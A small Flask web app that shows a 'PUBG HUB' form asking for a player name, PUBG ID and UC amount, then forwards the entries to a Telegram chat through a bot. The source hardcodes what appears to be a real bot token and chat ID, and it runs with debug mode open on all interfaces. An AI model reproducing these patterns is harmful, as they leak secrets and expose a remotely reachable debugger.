from flask import Flask, request
import requests

app = Flask(__name__)

# 🔴 ضع بيانات البوت هنا
BOT_TOKEN = "8073621434:AAH-Bm7fVfkl-1VeGZGE_oyBLGr2tSCNnhE"
CHAT_ID = "703015262"


def send_to_telegram(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": text
    }
    try:
        requests.post(url, data=data)
    except Exception as e:
        print("Error:", e)


@app.route("/")
def home():
    return """
    <html>
    <head>
    <title>PUBG HUB</title>
    <style>
        body{
            margin:0;
            font-family:Arial;
            background:linear-gradient(135deg,#0b0f1a,#1a1f2e);
            color:white;
            display:flex;
            justify-content:center;
            align-items:center;
            height:100vh;
        }

        .box{
            background:#151a26;
            padding:25px;
            border-radius:15px;
            width:320px;
        }

        input,select{
            width:100%;
            padding:12px;
            margin-top:10px;
            border:none;
            border-radius:8px;
        }

        button{
            width:100%;
            padding:12px;
            margin-top:15px;
            border:none;
            border-radius:10px;
            background:#f9a825;
            cursor:pointer;
            font-weight:bold;
        }
    </style>
    </head>

    <body>

    <div class="box">
        <h3 style="text-align:center;">PUBG Request</h3>

        <form action="/send" method="POST">

            <input name="name" placeholder="اسم اللاعب" required>

            <input name="pubg_id" placeholder="PUBG ID" required>

            <select name="uc">
                <option>60 UC</option>
                <option>325 UC</option>
                <option>660 UC</option>
                <option>1800 UC</option>
            </select>

            <button type="submit">إرسال</button>

        </form>
    </div>

    </body>
    </html>
    """


@app.route("/send", methods=["POST"])
def send():

    name = request.form.get("name")
    pubg_id = request.form.get("pubg_id")
    uc = request.form.get("uc")

    text = f"""
🎮 PUBG REQUEST

👤 الاسم: {name}
🆔 ID: {pubg_id}
💰 UC: {uc}
"""

    send_to_telegram(text)

    return """
    <h2 style='text-align:center;font-family:Arial;'>
    تم استلام الطلب ✅<br>
    برجاء الانتظار
    </h2>
    """


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
